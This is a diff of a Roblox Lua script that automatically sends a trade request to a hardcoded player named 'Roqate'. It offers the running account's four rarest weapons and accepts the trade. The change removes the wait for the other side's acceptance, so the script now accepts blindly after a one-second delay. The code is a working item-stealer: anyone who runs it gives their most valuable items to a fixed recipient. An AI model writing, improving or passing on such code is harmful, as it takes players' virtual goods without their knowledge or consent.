@@ -7,8 +7,7 @@ local TARGET_PLAYER = "Roqate"
 local MAX_ITEMS_PER_TRADE = 4
 local TRADE_COOLDOWN = 2
 local ITEM_ADD_DELAY = 0.5
-local UI_WAIT_TIMEOUT = 10
-local ACCEPT_WAIT_TIMEOUT = 20
+local ACCEPT_DELAY = 1 -- Wait 1 second before accepting
 
 -- Rarity priority
 local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
@@ -67,87 +66,11 @@ local function getTop4Weapons()
     return picked
 end
 
--- === UI Detection ===
-local function waitForTradeGUI()
-    local startTime = os.clock()
-    while os.clock() - startTime < UI_WAIT_TIMEOUT do
-        local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
-        if gui then
-            for _, label in ipairs(gui:GetDescendants()) do
-                if label:IsA("TextLabel") and string.find(string.lower(label.Text), "your offer") then
-                    return gui
-                end
-            end
-        end
-        task.wait(0.2)
-    end
-    return nil
-end
-
-local function isItemVisible(gui, itemName)
-    local searchName = string.lower(itemName)
-    for _, descendant in ipairs(gui:GetDescendants()) do
-        if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and descendant.Text then
-            if string.find(string.lower(descendant.Text), searchName) then
-                return true
-            end
-        end
-    end
-    return false
-end
-
--- === Trade Actions ===
-local function addAllItems(gui, weapons)
-    print("\n➕ Adding items:")
-    for _, weapon in ipairs(weapons) do
-        print("   - Attempting to add:", weapon)
-        TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
-        task.wait(ITEM_ADD_DELAY)
-    end
-end
-
-local function verifyItemsVisible(gui, weapons)
-    print("\n🔍 Verifying items:")
-    local allVisible = true
-    for _, weapon in ipairs(weapons) do
-        if isItemVisible(gui, weapon) then
-            print("   ✓", weapon)
-        else
-            print("   ❌", weapon, "(not visible)")
-            allVisible = false
-        end
-    end
-    return allVisible
-end
-
-local function waitForOtherAccept(gui)
-    local startTime = os.clock()
-    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
-        for _, label in ipairs(gui:GetDescendants()) do
-            if label:IsA("TextLabel") and string.find(string.lower(label.Text), "other player has accepted") then
-                return true
-            end
-        end
-        
-        if not gui.Parent then
-            return true
-        end
-        
-        task.wait(0.5)
-    end
-    return false
-end
-
--- === Main Trade Cycle ===
+-- === Trade Functions ===
 local function doTradeCycle(targetPlayer)
-    print("\n═════════ Starting Trade Cycle ═════════")
-    local weapons = getTop4Weapons()
-    if #weapons == 0 then return end
+    print("\n🔄 Starting trade with", targetPlayer.Name)
     
-    print("🎯 Target:", targetPlayer.Name)
-    print("📦 Items to trade:", table.concat(weapons, ", "))
-
-    -- Send trade request
+    -- 1. Send trade request
     local success, err = pcall(function()
         TradeRemotes.SendRequest:InvokeServer(targetPlayer)
     end)
@@ -155,42 +78,37 @@ local function doTradeCycle(targetPlayer)
         warn("❌ Trade request failed:", err)
         return
     end
-    print("✅ Trade request sent")
-
-    -- Wait for trade GUI
-    local gui = waitForTradeGUI()
-    if not gui then
-        warn("⚠ Trade GUI not found!")
-        return
-    end
-    print("✅ Trade GUI found")
-
-    -- Add all items regardless
-    addAllItems(gui, weapons)
-
-    -- Verify items are actually visible on screen
-    if verifyItemsVisible(gui, weapons) then
-        print("✅ All items visible - proceeding with trade")
-        
-        -- Wait for other player to accept
-        print("\n⏳ Waiting for other player to accept...")
-        if waitForOtherAccept(gui) then
-            print("✅ Other player accepted - completing trade")
-            TradeRemotes.AcceptTrade:FireServer()
-        else
-            warn("⚠ Timeout waiting for acceptance!")
+    print("✅ Request sent")
+    
+    -- Wait briefly for UI to appear
+    task.wait(1)
+    
+    -- 2. Add all items without verification
+    local weapons = getTop4Weapons()
+    if #weapons > 0 then
+        print("➕ Adding items:", table.concat(weapons, ", "))
+        for _, weapon in ipairs(weapons) do
+            pcall(function()
+                TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
+            end)
+            task.wait(ITEM_ADD_DELAY)
         end
     else
-        warn("⚠ Not all items visible - trade may fail!")
+        warn("⚠ No items to add!")
+        return
     end
-
-    -- Wait for trade to complete (GUI to close)
-    print("\n🔄 Waiting for trade to complete...")
-    local startTime = os.clock()
-    while gui and gui.Parent and os.clock() - startTime < 5 do
-        task.wait(0.5)
-    end
-    print("✅ Trade cycle completed\n")
+    
+    -- 3. Accept after delay
+    task.wait(ACCEPT_DELAY)
+    print("✅ Accepting trade")
+    pcall(function()
+        TradeRemotes.AcceptTrade:FireServer()
+    end)
+    
+    -- 4. Wait for trade to complete
+    print("⏳ Waiting for trade to complete...")
+    task.wait(3)
+    print("✅ Cycle complete\n")
 end
 
 -- === Main Loop ===
